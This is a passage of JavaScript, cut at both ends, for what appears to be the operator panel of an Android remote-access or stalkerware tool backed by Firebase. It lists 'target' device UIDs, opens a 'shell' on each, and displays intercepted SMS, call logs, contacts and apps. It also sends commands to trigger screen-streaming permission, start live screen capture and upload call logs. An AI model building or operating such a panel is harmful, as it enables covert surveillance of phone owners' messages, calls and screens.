    state.castStep === 'allowed' ||
    state.castStep === 'started' ||
    streaming ||
    ctrlAction === 'ALLOW_PERMISSION' ||
    ctrlAction === 'START_CAST';
  const started = streaming || state.castStep === 'started';
  const stopped = !streaming && state.castStep === 'stopped';
  return { streaming, allowed, started, stopped };
}

function updateCastFlowButtonsDom() {
  const { streaming, allowed, started, stopped } = getEffectiveCastState();
  const allowBtn = document.getElementById('btn-cast-allow');
  const startBtn = document.getElementById('btn-cast-start');
  const stopBtn = document.getElementById('btn-cast-stop');
  const badge = document.getElementById('remote-screen-live-badge');

  if (allowBtn) {
    allowBtn.className = `py-1.5 px-2 text-[10px] sm:text-[11px] font-mono-tabular font-semibold border rounded-lg cursor-pointer transition-colors ${
      allowed
        ? 'bg-cyan-500/20 border-cyan-400/60 text-cyan-200'
        : 'bg-[#07130e] border-cyan-500/35 text-cyan-300 hover:bg-cyan-500/15'
    }`;
    allowBtn.textContent = allowed ? '✓ 1. Allow' : '1. Allow';
  }

  if (startBtn) {
    startBtn.className = `py-1.5 px-2 text-[10px] sm:text-[11px] font-mono-tabular font-semibold border rounded-lg cursor-pointer transition-colors ${
      started
        ? 'bg-emerald-500/25 border-emerald-400/70 text-emerald-200'
        : 'bg-[#07130e] border-emerald-500/35 text-emerald-300 hover:bg-emerald-500/15'
    }`;
    startBtn.textContent = streaming ? '● 2. Live' : started ? '▶ 2. Starting' : '2. Start';
  }

  if (stopBtn) {
    stopBtn.className = `py-1.5 px-2 text-[10px] sm:text-[11px] font-mono-tabular font-semibold border rounded-lg cursor-pointer transition-colors ${
      stopped
        ? 'bg-red-500/25 border-red-400/70 text-red-200'
        : 'bg-[#07130e] border-red-500/35 text-red-300 hover:bg-red-500/15'
    }`;
    stopBtn.textContent = stopped ? '■ 3. Stopped' : '3. Stop';
  }

  if (badge) {
    badge.textContent = streaming ? 'LIVE' : allowed ? 'ALLOWED' : 'IDLE';
    badge.className = `px-2 py-0.5 text-[10px] font-mono-tabular font-semibold rounded-md border ${
      streaming
        ? 'bg-emerald-500/20 border-emerald-400/50 text-emerald-300'
        : allowed
          ? 'bg-cyan-500/15 border-cyan-400/40 text-cyan-300'
          : 'bg-slate-900 border-slate-700 text-slate-400'
    }`;
  }
}

async function sendCastStepCommand(step) {
  if (!state.activeUid) return;
  const rtdb = getRtdb();
  const controlKey = resolveCollectionKey(state.rawUidNode, ['screenControl', 'screen_control', 'control'], 'screenControl');
  const controlPath = devicePath(state.activeUid, controlKey);
  const cmdKey = resolveCollectionKey(state.rawUidNode, ['commands', 'command', 'cmd'], 'commands');
  const cmdPath = devicePath(state.activeUid, cmdKey);
  const now = Date.now();

  let commandName = 'ALLOW_SCREEN_PERMISSION';
  let controlPayload = {
    action: 'ALLOW_PERMISSION',
    allow: true,
    status: 'pending',
    timestamp: now,
  };
  let toastTitle = 'Allow Popup Sent';

  if (step === 'start') {
    commandName = 'START_SCREEN_STREAM';
    controlPayload = {
      action: 'START_CAST',
      status: 'pending',
      timestamp: now,
    };
    state.castStep = 'started';
    toastTitle = 'Cast Start Sent';
  } else if (step === 'stop') {
    commandName = 'STOP_SCREEN_STREAM';
    controlPayload = {
      action: 'STOP_CAST',
      status: 'pending',
      timestamp: now,
    };
    state.castStep = 'stopped';
    toastTitle = 'Cast Stop Sent';
  } else {
    state.castStep = 'allowed';
  }

  updateCastFlowButtonsDom();
  showPhoneToast(toastTitle, `${commandName} → /${cmdPath}`);

  try {
    await Promise.all([
      set(ref(rtdb, controlPath), controlPayload),
      pushCommandCapped(cmdKey, cmdPath, {
        command: commandName,
        target: 'screen',
        ...controlPayload,
        payload: JSON.stringify(controlPayload),
        timestampLabel: formatNowLabel(),
        createdAt: now,
      }),
    ]);
  } catch (err) {
    handleRtdbError(err, OperationType.WRITE, cmdPath);
    showErrorBanner(err.message);
  }
}

// --- Navigation Inside Phone Emulator ---
function navigateTo(nextScreen) {
  if (!state.activeUid) return;
  if (state.locked && nextScreen !== 'lock') {
    state.locked = false;
  }
  if (state.screen !== nextScreen) {
    state.screenHistory.push(state.screen);
    if (state.screenHistory.length > 15) state.screenHistory.shift();
  }
  state.screen = nextScreen;
  state.shadeOpen = false;
  renderPhoneStatusBarAndShade();
  renderPhoneScreen();
}

function goBack() {
  if (state.shadeOpen) {
    state.shadeOpen = false;
    renderPhoneStatusBarAndShade();
    return;
  }
  if (state.screen === 'messages' && state.activeThreadPhone) {
    state.activeThreadPhone = null;
    renderPhoneScreen();
    return;
  }
  if (state.screen === 'messages' && state.showNewMessageForm) {
    state.showNewMessageForm = false;
    renderPhoneScreen();
    return;
  }
  if (state.screen === 'contacts' && state.showAddContactForm) {
    state.showAddContactForm = false;
    renderPhoneScreen();
    return;
  }
  if (state.screen === 'apps' && state.showInstallAppForm) {
    state.showInstallAppForm = false;
    renderPhoneScreen();
    return;
  }
  const prev = state.screenHistory.pop();
  if (prev && prev !== 'lock') {
    state.screen = prev;
  } else if (!state.locked) {
    state.screen = 'home';
  }
  renderPhoneScreen();
}

// --- Rendering ---
function renderViewStage() {
  const header = document.getElementById('top-app-header');
  const dirView = document.getElementById('uid-directory-view');
  const emuView = document.getElementById('emulator-workspace-view');
  const hasActive = Boolean(state.activeUid);

  if (header) header.classList.toggle('hidden', hasActive);
  if (dirView) dirView.classList.toggle('hidden', hasActive);
  if (emuView) emuView.classList.toggle('hidden', !hasActive);
  document.body.classList.toggle('overflow-hidden', hasActive);

  document.querySelectorAll('[data-jump-screen]').forEach((btn) => {
    btn.classList.toggle('opacity-40', !hasActive);
    btn.classList.toggle('pointer-events-none', !hasActive);
  });
}

function renderDeviceUidList() {
  const listEl = document.getElementById('device-uid-list');
  if (!listEl) return;

  if (state.loadingDevices) {
    listEl.innerHTML = `<div class="p-5 text-sm text-slate-500">Loading devices from Realtime Database...</div>`;
    return;
  }

  if (state.rtdbError) {
    listEl.innerHTML = `
      <div class="p-5 text-sm text-red-700 space-y-1.5">
        <p class="font-semibold">Unable to read Realtime Database root</p>
        <p class="text-xs font-mono-tabular">${esc(state.rtdbError)}</p>
      </div>
    `;
    return;
  }

  if (state.devices.length === 0) {
    listEl.innerHTML = `
      <div class="p-5 text-sm font-mono-tabular text-slate-400">
        No device UIDs found in Realtime Database.
      </div>
    `;
    return;
  }

  listEl.innerHTML = state.devices
    .map((d) => `
      <button
        type="button"
        data-select-uid="${esc(d.id)}"
        class="w-full px-5 py-4 text-left flex items-center justify-between gap-4 bg-[#050b08] hover:bg-[#091812] transition-colors cursor-pointer"
      >
        <div class="min-w-0">
          <p class="text-sm font-semibold text-emerald-200 truncate">${esc(d.deviceName || d.id)}</p>
          <p class="text-xs font-mono-tabular text-slate-400 truncate mt-0.5">
            <span class="text-emerald-400">/${esc(devicePath(d.id))}</span> · ${d.online ? '<span class="text-emerald-400">Online</span>' : '<span class="text-slate-500">Offline</span>'} · ${Math.round(d.batteryLevel)}%${d.isCharging ? ' (Charging)' : ''}
          </p>
        </div>
        <span class="px-3 py-1.5 text-xs font-mono-tabular font-semibold text-emerald-300 bg-emerald-500/15 border border-emerald-500/30 rounded-lg shrink-0">
          Open Shell →
        </span>
      </button>
    `)
    .join('');
}

function renderPhoneStatusBarAndShade() {
  const status = state.status;
  const deviceName = status?.deviceName || state.activeUid || 'Emulator';
  const battery = status ? Math.round(Number(status.batteryLevel) || 0) : 0;
  const charging = Boolean(status?.isCharging);
  const net = status?.networkType || '5G';
  const signal = status ? Math.max(0, Math.min(4, Math.round(Number(status.signalStrength) || 0))) : 4;

  const sbMini = document.getElementById('sb-device-mini');
  const sbNet = document.getElementById('sb-network');
  const sbSignal = document.getElementById('sb-signal-bars');
  const sbBatt = document.getElementById('sb-battery');

  if (sbMini) sbMini.textContent = deviceName;
  if (sbNet) sbNet.textContent = net;
  if (sbSignal) {
    sbSignal.innerHTML = [1, 2, 3, 4]
      .map((bar) => {
        const active = net !== 'Offline' && bar <= signal;
        const h = 4 + bar * 2;
        return `<span style="width:2.5px;height:${h}px;border-radius:1px;background:${active ? '#34d399' : 'rgba(16,185,129,0.2)'}"></span>`;
      })
      .join('');
  }
  if (sbBatt) {
    const battColor = charging ? 'text-emerald-400' : battery <= 15 ? 'text-red-400' : battery <= 30 ? 'text-amber-400' : 'text-emerald-200';
    sbBatt.className = `inline-flex items-center gap-1 text-[11px] font-mono-tabular ${battColor}`;
    sbBatt.textContent = status ? `${charging ? '⚡' : ''}${battery}%` : '—';
  }

  const shadeEl = document.getElementById('phone-quick-shade');
  if (shadeEl) {
    shadeEl.classList.toggle('open', state.shadeOpen);
    shadeEl.classList.toggle('closed', !state.shadeOpen);
  }
  const shadeDev = document.getElementById('shade-device-name');
  const shadeUid = document.getElementById('shade-uid-label');
  const shadeWifi = document.getElementById('shade-wifi-text');
  const shadeBt = document.getElementById('shade-bt-text');
  const shadeCharging = document.getElementById('shade-charging-text');
  const shadeBatt = document.getElementById('shade-battery-text');
  const shadeNotifs = document.getElementById('shade-notifications');

  if (shadeDev) shadeDev.textContent = deviceName;
  if (shadeUid) shadeUid.textContent = state.activeUid ? `/${devicePath(state.activeUid, 'status')}` : 'uid: none';
  if (shadeWifi) shadeWifi.textContent = status?.wifiConnected ? status.wifiName || 'Connected' : 'Disconnected';
  if (shadeBt) shadeBt.textContent = status?.bluetoothOn ? 'Active' : 'Off';
  if (shadeCharging) shadeCharging.textContent = charging ? 'Charging (USB-C)' : 'Battery Power';
  if (shadeBatt) shadeBatt.textContent = status ? `${battery}% · ${status.temperatureC}°C` : '—';

  if (shadeNotifs) {
    const unreadMsgs = state.messages.filter((m) => m.unread);
    const missedCalls = state.calllog.filter((c) => c.type === 'missed');
    const items = [];
    if (unreadMsgs[0]) {
      items.push(`<div class="p-2.5 rounded-lg bg-[#07130e] border border-emerald-500/20"><p class="font-medium text-emerald-200 truncate">SMS · ${esc(unreadMsgs[0].senderName)}</p><p class="text-slate-400 truncate mt-0.5">${esc(unreadMsgs[0].body)}</p></div>`);
    }
    if (missedCalls[0]) {
      items.push(`<div class="p-2.5 rounded-lg bg-[#07130e] border border-emerald-500/20"><p class="font-medium text-emerald-200 truncate">Missed Call · ${esc(missedCalls[0].name)}</p><p class="text-slate-400 font-mono-tabular mt-0.5">${esc(missedCalls[0].phoneNumber)} · ${esc(missedCalls[0].timestampLabel)}</p></div>`);
    }
    if (items.length === 0) {
      items.push(`<p class="text-slate-500 font-mono-tabular">No unread notifications.</p>`);
    }
    shadeNotifs.innerHTML = items.join('');
  }
}

function getAppGlyph(name) {
  const n = (name || '').toLowerCase();
  if (n.includes('phone')) return { bg: 'bg-emerald-600/80 border border-emerald-400/40', label: 'PH' };
  if (n.includes('messag')) return { bg: 'bg-cyan-700/80 border border-cyan-400/40', label: 'MS' };
  if (n.includes('contact')) return { bg: 'bg-teal-700/80 border border-teal-400/40', label: 'CT' };
  if (n.includes('screen') || n.includes('mirror')) return { bg: 'bg-cyan-700/80 border border-cyan-400/50', label: 'SC' };
  if (n.includes('command') || n.includes('cmd')) return { bg: 'bg-emerald-700/80 border border-emerald-400/50', label: 'CM' };
  if (n.includes('system') || n.includes('setting')) return { bg: 'bg-slate-800 border border-emerald-500/30', label: 'SY' };
  return { bg: 'bg-slate-800 border border-emerald-500/25', label: (name || 'AP').slice(0, 2).toUpperCase() };
}

function launchAppByName(appName) {
  const n = (appName || '').toLowerCase();
  if (n.includes('phone') || n.includes('dialer')) return navigateTo('phone');
  if (n.includes('messag') || n.includes('sms')) return navigateTo('messages');
  if (n.includes('contact')) return navigateTo('contacts');
  if (n.includes('screen') || n.includes('mirror')) return navigateTo('screen');
  if (n.includes('command') || n.includes('cmd')) return navigateTo('commands');
  if (n.includes('system') || n.includes('battery') || n.includes('setting')) return navigateTo('settings');
  showPhoneToast(appName, 'Running in sandboxed emulator view');
}

function renderLockScreen() {
  const now = new Date();
  const timeStr = now.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', hour12: false });
  const dateStr = now.toLocaleDateString([], { weekday: 'long', month: 'short', day: 'numeric' });
  const status = state.status;
  const deviceName = status?.deviceName || state.activeUid;
  const batt = status ? `${Math.round(status.batteryLevel)}%${status.isCharging ? ' · Charging' : ''}` : 'Loading...';
  const unreadCount = state.messages.filter((m) => m.unread).length;
  const missedCount = state.calllog.filter((c) => c.type === 'missed').length;

  return `
    <div class="h-full flex flex-col justify-between p-6 text-center">
      <div class="pt-8">
        <p id="lock-clock-display" class="text-5xl font-bold tracking-tight font-mono-tabular text-emerald-400">${esc(timeStr)}</p>
        <p class="text-xs font-mono-tabular text-slate-400 mt-1.5">${esc(dateStr)}</p>
        <p class="text-xs font-mono-tabular text-emerald-300/80 mt-2">${esc(deviceName)} · <span>${esc(batt)}</span></p>
      </div>

      <div class="space-y-2.5 text-left">
        <div class="p-3.5 rounded-xl bg-[#07130e]/90 border border-emerald-500/25">
          <p class="text-xs font-mono-tabular font-semibold text-emerald-300">TARGET_UID: ${esc(state.activeUid)}</p>
          <p class="text-[11px] text-slate-300 mt-0.5 font-mono-tabular">
            ${unreadCount} unread SMS · ${missedCount} missed calls · ${state.apps.length} apps
          </p>
        </div>
      </div>

      <div class="pb-2">
        <button
          type="button"
          data-action="unlock-phone"
          class="w-full h-11 rounded-xl bg-emerald-500/15 hover:bg-emerald-500/25 border border-emerald-500/40 text-emerald-300 text-xs font-mono-tabular font-semibold transition-colors cursor-pointer"
        >
          &gt; UNLOCK_SHELL
        </button>
      </div>
    </div>
  `;
}

function renderHomeScreen() {
  if (!state.status) {
    return `
      <div class="h-full flex flex-col items-center justify-center p-6 text-center">
        <p class="text-sm font-mono-tabular font-semibold text-emerald-300">SYNCING_RTDB_NODE...</p>
        <p class="text-xs font-mono-tabular text-slate-400 mt-1.5">${esc(devicePath(state.activeUid, 'status'))}</p>
      </div>
    `;
  }

  const status = state.status;
  const deviceName = status.deviceName || state.activeUid;
  const batt = Math.round(Number(status.batteryLevel) || 0);
  const chargingLabel = status.isCharging ? 'CHARGING' : 'ON_BATTERY';
  const unreadCount = state.messages.filter((m) => m.unread).length;
  const latestCall = state.calllog[0];
  const latestMsg = state.messages[0];
  const enabledApps = state.apps.filter((a) => a.enabled);

  return `
    <div class="h-full flex flex-col justify-between p-4 gap-3">
      <div class="space-y-3">
        <button
          type="button"
          data-nav="settings"
          class="w-full p-4 rounded-2xl bg-[#07130e]/90 border border-emerald-500/25 text-left hover:border-emerald-400/50 transition-colors cursor-pointer"
        >
          <div class="flex items-start justify-between gap-2">
            <div class="min-w-0">
              <p class="text-[11px] font-mono-tabular text-emerald-400/80">&gt; DEVICE_TELEMETRY</p>
              <p class="text-sm font-bold text-white truncate mt-0.5">${esc(deviceName)}</p>
              <p class="text-[11px] font-mono-tabular text-slate-400 truncate mt-0.5">${esc(devicePath(state.activeUid, 'status'))}</p>
            </div>
            <div class="text-right shrink-0">
              <p class="text-2xl font-bold font-mono-tabular ${status.isCharging ? 'text-emerald-400' : batt <= 20 ? 'text-amber-400' : 'text-emerald-300'}">${batt}%</p>
              <p class="text-[10px] font-mono-tabular text-slate-400">${esc(chargingLabel)}</p>
            </div>
          </div>
          <div class="mt-3 w-full h-1.5 rounded-full bg-slate-900 overflow-hidden">
            <div class="h-full ${status.isCharging ? 'bg-emerald-400' : batt <= 20 ? 'bg-amber-500' : 'bg-emerald-500'}" style="width:${Math.max(2, Math.min(100, batt))}%"></div>
          </div>
        </button>

        <button
          type="button"
          data-nav="screen"
          class="w-full p-3 rounded-2xl bg-[#07130e]/90 border border-cyan-500/35 text-left hover:border-cyan-400/70 transition-colors cursor-pointer flex items-center justify-between gap-3"
        >
          <div class="min-w-0">
            <p class="text-[10px] font-mono-tabular text-cyan-400">&gt; LIVE_SCREEN_BASE64</p>
            <p class="text-xs font-semibold text-white truncate mt-0.5">Remote Screen &amp; Tap Control</p>
            <p class="text-[11px] font-mono-tabular text-slate-400 truncate mt-0.5">
              ${state.screenData?.imageSrc ? `${state.screenData.width}×${state.screenData.height} · Base64 active` : `Waiting at ${devicePath(state.activeUid, 'screen')}`}
            </p>
          </div>
          <span class="px-2.5 py-1.5 text-[11px] font-mono-tabular font-semibold bg-cyan-500/15 border border-cyan-400/40 text-cyan-300 rounded-lg shrink-0">
            Open Screen →
          </span>
        </button>

        <div class="grid grid-cols-2 gap-2.5">
          <button
            type="button"
            data-nav="commands"
            class="p-3 rounded-2xl bg-[#07130e]/85 border border-emerald-500/30 text-left hover:border-emerald-400/60 transition-colors cursor-pointer"
          >
            <p class="text-[10px] font-mono-tabular text-emerald-400">LIST_UPLOAD_CMD</p>
            <p class="text-xs font-semibold text-white truncate mt-1">Command Center</p>
            <p class="text-[11px] font-mono-tabular text-slate-400 truncate mt-0.5">${state.commands.filter((c) => c.status === 'pending').length} pending · ${state.commands.length} total</p>
          </button>

          <button
            type="button"
            data-nav="settings"
            class="p-3 rounded-2xl bg-[#07130e]/85 border border-emerald-500/30 text-left hover:border-emerald-400/60 transition-colors cursor-pointer"
          >
            <p class="text-[10px] font-mono-tabular text-emerald-400">STATUS_UPDATER</p>
            <p class="text-xs font-semibold text-white truncate mt-1">${status.online ? 'Online' : 'Offline'} · ${esc(status.networkType)}</p>
            <p class="text-[11px] font-mono-tabular text-slate-400 truncate mt-0.5">Edit &amp; sync device status</p>
          </button>
        </div>

        <div class="grid grid-cols-2 gap-2.5">
          <button
            type="button"
            data-nav="phone"
            class="p-3 rounded-2xl bg-[#07130e]/85 border border-emerald-500/20 text-left hover:border-emerald-400/45 transition-colors cursor-pointer"
          >
            <p class="text-[10px] font-mono-tabular text-emerald-400/80">LATEST_CALL</p>
            <p class="text-xs font-semibold text-white truncate mt-1">${latestCall ? esc(latestCall.name) : 'No calls'}</p>
            <p class="text-[11px] font-mono-tabular text-slate-400 truncate mt-0.5">${latestCall ? `${esc(latestCall.type)} · ${esc(formatDuration(latestCall.durationSec))}` : 'uid/calllog'}</p>
          </button>

          <button
            type="button"
            data-nav="messages"
            class="p-3 rounded-2xl bg-[#07130e]/85 border border-emerald-500/20 text-left hover:border-emerald-400/45 transition-colors cursor-pointer"
          >
            <p class="text-[10px] font-mono-tabular text-emerald-400/80">SMS_INTERCEPT · ${unreadCount}</p>
            <p class="text-xs font-semibold text-white truncate mt-1">${latestMsg ? esc(latestMsg.senderName) : 'No SMS'}</p>
            <p class="text-[11px] text-slate-400 truncate mt-0.5">${latestMsg ? esc(latestMsg.body) : 'Inbox empty'}</p>
          </button>
        </div>

        <div>
          <div class="flex items-center justify-between px-1 mb-2">
            <p class="text-xs font-mono-tabular font-semibold text-emerald-300">APPS (${enabledApps.length})</p>
            <button type="button" data-nav="apps" class="text-[11px] font-mono-tabular font-medium text-emerald-400 hover:text-emerald-300 cursor-pointer">
              ALL_APPS →
            </button>
          </div>
          <div class="grid grid-cols-4 gap-2.5">
            ${enabledApps
              .slice(0, 8)
              .map((appItem) => {
                const glyph = getAppGlyph(appItem.name);
                return `
                  <button
                    type="button"
                    data-launch-app="${esc(appItem.name)}"
                    class="flex flex-col items-center gap-1.5 p-1.5 rounded-xl hover:bg-emerald-500/10 transition-colors cursor-pointer"
                  >
                    <span class="w-11 h-11 rounded-2xl ${glyph.bg} text-white text-xs font-mono-tabular font-bold flex items-center justify-center shadow-sm">${esc(glyph.label)}</span>
                    <span class="text-[10px] text-slate-200 truncate w-full text-center">${esc(appItem.name)}</span>
                  </button>
                `;
              })
              .join('')}
          </div>
        </div>
      </div>

      <div class="p-2 rounded-2xl bg-[#07130e]/90 border border-emerald-500/25 grid grid-cols-5 gap-1">
        <button type="button" data-nav="phone" class="flex flex-col items-center justify-center py-2 rounded-xl hover:bg-emerald-500/10 cursor-pointer">
          <span class="w-9 h-9 rounded-xl bg-emerald-600/80 border border-emerald-400/40 text-white text-[11px] font-mono-tabular font-bold flex items-center justify-center">PH</span>
          <span class="text-[10px] text-slate-200 mt-1">Phone</span>
        </button>
        <button type="button" data-nav="messages" class="flex flex-col items-center justify-center py-2 rounded-xl hover:bg-emerald-500/10 cursor-pointer">
          <span class="w-9 h-9 rounded-xl bg-cyan-700/80 border border-cyan-400/40 text-white text-[11px] font-mono-tabular font-bold flex items-center justify-center">MS</span>
          <span class="text-[10px] text-slate-200 mt-1">SMS${unreadCount > 0 ? ` (${unreadCount})` : ''}</span>
        </button>
        <button type="button" data-nav="screen" class="flex flex-col items-center justify-center py-2 rounded-xl hover:bg-emerald-500/10 cursor-pointer">
          <span class="w-9 h-9 rounded-xl bg-cyan-950 border border-cyan-400/50 text-cyan-300 text-[11px] font-mono-tabular font-bold flex items-center justify-center">SC</span>
          <span class="text-[10px] text-slate-200 mt-1">Screen</span>
        </button>
        <button type="button" data-nav="contacts" class="flex flex-col items-center justify-center py-2 rounded-xl hover:bg-emerald-500/10 cursor-pointer">
          <span class="w-9 h-9 rounded-xl bg-teal-700/80 border border-teal-400/40 text-white text-[11px] font-mono-tabular font-bold flex items-center justify-center">CT</span>
          <span class="text-[10px] text-slate-200 mt-1">Contacts</span>
        </button>
        <button type="button" data-nav="commands" class="flex flex-col items-center justify-center py-2 rounded-xl hover:bg-emerald-500/10 cursor-pointer">
          <span class="w-9 h-9 rounded-xl bg-emerald-950 border border-emerald-400/50 text-emerald-300 text-[11px] font-mono-tabular font-bold flex items-center justify-center">CM</span>
          <span class="text-[10px] text-slate-200 mt-1">Cmd</span>
        </button>
      </div>
    </div>
  `;
}

function renderPhoneScreenApp() {
  const tab = state.phoneTab;
  const filteredCalls = tab === 'missed'
    ? state.calllog.filter((c) => c.type === 'missed')
    : state.calllog;

  const dialpadKeys = [
    ['1', ''], ['2', 'ABC'], ['3', 'DEF'],
    ['4', 'GHI'], ['5', 'JKL'], ['6', 'MNO'],
    ['7', 'PQRS'], ['8', 'TUV'], ['9', 'WXYZ'],
    ['*', ''], ['0', '+'], ['#', ''],
  ];

  return `
    <div class="min-h-full bg-[#040a07] flex flex-col">
      <div class="sticky top-0 z-10 bg-[#040a07]/95 backdrop-blur-md px-4 pt-3 pb-2.5 border-b border-slate-800">
        <div class="flex items-center justify-between gap-2">
          <div>
            <h2 class="text-sm font-bold text-white">Phone &amp; Call Log</h2>
            <p class="text-[11px] font-mono-tabular text-slate-400">${esc(devicePath(state.activeUid, 'calllog'))} · ${state.calllog.length} records</p>
          </div>
          <button
            type="button"
            data-send-upload-cmd="UPLOAD_CALLLOG"
            data-upload-target="calllog"
            class="px-2.5 py-1.5 text-[11px] font-mono-tabular font-semibold bg-emerald-500/15 border border-emerald-500/35 text-emerald-300 hover:bg-emerald-500/25 rounded-lg cursor-pointer shrink-0"
          >
            ↑ Upload Cmd
          </button>
        </div>
        <div class="grid grid-cols-3 gap-1 p-1 mt-2.5 bg-slate-900 rounded-lg">
          <button type="button" data-phone-tab="all" class="py-1.5 text-xs font-medium rounded-md cursor-pointer ${tab === 'all' ? 'bg-emerald-600 text-white' : 'text-slate-400 hover:text-white'}">All</button>
          <button type="button" data-phone-tab="missed" class="py-1.5 text-xs font-medium rounded-md cursor-pointer ${tab === 'missed' ? 'bg-emerald-600 text-white' : 'text-slate-400 hover:text-white'}">Missed</button>
          <button type="button" data-phone-tab="dialer" class="py-1.5 text-xs font-medium rounded-md cursor-pointer ${tab === 'dialer' ? 'bg-emerald-600 text-white' : 'text-slate-400 hover:text-white'}">Dialer</button>
        </div>
      </div>

      ${tab === 'dialer' ? `
        <div class="p-4 flex-1 flex flex-col justify-between gap-3">
          <div class="p-3 rounded-xl bg-[#07130e] border border-emerald-500/20 flex items-center justify-between gap-2">
            <input
              id="dialer-input"
              type="text"
              maxlength="32"
              value="${esc(state.dialNumber)}"
              placeholder="Enter number..."
              class="w-full bg-transparent text-lg font-mono-tabular text-white focus:outline-none"
            />
            <button type="button" data-action="dial-backspace" class="px-2.5 py-1 text-xs text-slate-300 bg-slate-800 rounded-lg hover:bg-slate-700 cursor-pointer">Del</button>
          </div>

          <div class="grid grid-cols-3 gap-2">
            ${dialpadKeys
              .map(
                ([num, sub]) => `
                <button type="button" data-dial-key="${esc(num)}" class="dialpad-key cursor-pointer">
                  <span class="text-base font-semibold font-mono-tabular">${esc(num)}</span>
                  ${sub ? `<span class="text-[9px] text-slate-400 tracking-wider">${esc(sub)}</span>` : ''}
                </button>
              `
              )
              .join('')}
          </div>

          <button
            type="button"
            data-action="place-call"
            class="w-full h-11 rounded-xl bg-emerald-600 hover:bg-emerald-700 text-white text-xs font-semibold transition-colors cursor-pointer"
          >
            Place Outgoing Call
          </button>
        </div>
      ` : `
        <div class="divide-y divide-slate-800/80">
          ${filteredCalls.length === 0 ? `
            <div class="p-6 text-center">
              <p class="text-xs text-slate-400">No call records in this view.</p>
              <button type="button" data-phone-tab="dialer" class="mt-3 px-4 py-2 text-xs font-semibold bg-emerald-600 text-white rounded-lg cursor-pointer">Open Dialer</button>
            </div>
          ` : filteredCalls
            .map((c) => {
              const typeColor = c.type === 'missed' ? 'text-red-400' : c.type === 'incoming' ? 'text-emerald-400' : 'text-blue-400';
              const typeLabel = c.type === 'missed' ? 'Missed' : c.type === 'incoming' ? 'Incoming' : 'Outgoing';
              return `
                <div class="px-4 py-3 flex items-center justify-between gap-3 hover:bg-slate-900/60">
                  <div class="min-w-0">
                    <p class="text-xs font-semibold text-white truncate">${esc(c.name)}</p>
                    <p class="text-[11px] font-mono-tabular text-slate-400 truncate mt-0.5">${esc(c.phoneNumber)}</p>
                    <p class="text-[10px] mt-0.5 ${typeColor}">
                      ${esc(typeLabel)} · <span class="text-slate-400 font-mono-tabular">${esc(formatDuration(c.durationSec))} · ${esc(c.timestampLabel)}</span>
                    </p>
                  </div>
                  <div class="flex items-center gap-1.5 shrink-0">
                    <button
                      type="button"
                      data-callback-number="${esc(c.phoneNumber)}"
                      data-callback-name="${esc(c.name)}"
                      class="px-2.5 py-1.5 text-[11px] font-medium bg-emerald-600/20 text-emerald-300 hover:bg-emerald-600/35 rounded-lg cursor-pointer"
                    >
                      Call
                    </button>
                    <button
                      type="button"
                      data-delete-call="${esc(c.id)}"
                      class="px-2 py-1.5 text-[11px] text-slate-400 hover:text-red-400 rounded-lg cursor-pointer"
                      aria-label="Delete call log"
                    >
                      ×
                    </button>
                  </div>
                </div>
              `;
            })
            .join('')}
        </div>
      `}
    </div>
  `;
}

function renderMessagesScreen() {
  if (state.showNewMessageForm) {
    return `
      <div class="min-h-full bg-[#040a07] flex flex-col">
        <div class="sticky top-0 bg-[#040a07] px-4 py-3 border-b border-slate-800 flex items-center justify-between">
          <h2 class="text-sm font-bold text-white">New SMS Message</h2>
          <button type="button" data-action="close-new-msg" class="text-xs text-slate-400 hover:text-white cursor-pointer">Cancel</button>
        </div>
        <form id="form-new-sms" class="p-4 space-y-3">
          <div>
            <label class="block text-[11px] text-slate-400 mb-1">Recipient Name</label>
            <input name="senderName" type="text" maxlength="80" required placeholder="e.g. Vikram Nair" class="w-full h-10 px-3 text-xs bg-[#07130e] border border-emerald-500/20 rounded-lg text-white focus:outline-none focus:ring-1 focus:ring-blue-500" />
          </div>
          <div>
            <label class="block text-[11px] text-slate-400 mb-1">Phone Number</label>
            <input name="phoneNumber" type="text" maxlength="32" required placeholder="+91 98450 22918" class="w-full h-10 px-3 text-xs font-mono-tabular bg-[#07130e] border border-emerald-500/20 rounded-lg text-white focus:outline-none focus:ring-1 focus:ring-blue-500" />
          </div>
          <div>
            <label class="block text-[11px] text-slate-400 mb-1">Message</label>
            <textarea name="body" rows="4" maxlength="1000" required placeholder="Type SMS text..." class="w-full p-3 text-xs bg-[#07130e] border border-emerald-500/20 rounded-lg text-white focus:outline-none focus:ring-1 focus:ring-blue-500"></textarea>
          </div>
          <button type="submit" class="w-full h-11 rounded-xl bg-emerald-600 hover:bg-emerald-500 text-white text-xs font-semibold cursor-pointer">Send SMS</button>
        </form>
      </div>
    `;
  }

  if (state.activeThreadPhone) {
    const threadMsgs = state.messages
      .filter((m) => m.phoneNumber === state.activeThreadPhone)
      .slice()
      .reverse();
    const title = threadMsgs[0]?.senderName || state.activeThreadPhone;

    return `
      <div class="h-full bg-[#040a07] flex flex-col">
        <div class="sticky top-0 z-10 bg-[#040a07] px-4 py-3 border-b border-slate-800 flex items-center justify-between gap-2 shrink-0">
          <div class="min-w-0">
            <h2 class="text-sm font-bold text-white truncate">${esc(title)}</h2>
            <p class="text-[11px] font-mono-tabular text-slate-400 truncate">${esc(state.activeThreadPhone)}</p>
          </div>
          <button type="button" data-action="close-thread" class="px-2.5 py-1 text-xs bg-slate-800 text-slate-200 rounded-lg hover:bg-slate-700 cursor-pointer shrink-0">Inbox</button>
        </div>

        <div class="flex-1 overflow-y-auto phone-scroll p-3 space-y-2.5">
          ${threadMsgs
            .map((m) => {
              const outbound = m.direction === 'outbound';
              return `
                <div class="flex flex-col ${outbound ? 'items-end' : 'items-start'}">
                  <div class="max-w-[85%] px-3 py-2 rounded-2xl text-xs leading-relaxed ${outbound ? 'bg-emerald-600 text-white' : 'bg-slate-800 text-slate-100'}">
                    ${esc(m.body)}
                  </div>
                  <span class="text-[10px] font-mono-tabular text-slate-500 mt-1 px-1">${esc(m.timestampLabel)}</span>
                </div>
              `;
            })
            .join('')}
        </div>

        <form id="form-reply-sms" class="p-2.5 bg-slate-900 border-t border-slate-800 flex items-center gap-2 shrink-0">
          <input
            id="input-sms-reply"
            type="text"
            maxlength="1000"
            required
            placeholder="Text message..."
            class="flex-1 h-10 px-3 text-xs bg-[#040a07] border border-slate-800 rounded-xl text-white focus:outline-none focus:ring-1 focus:ring-blue-500"
          />
          <button type="submit" class="h-10 px-3.5 text-xs font-semibold bg-emerald-600 hover:bg-emerald-500 text-white rounded-xl cursor-pointer">Send</button>
        </form>
      </div>
    `;
  }

  const threadsMap = new Map();
  for (const m of state.messages) {
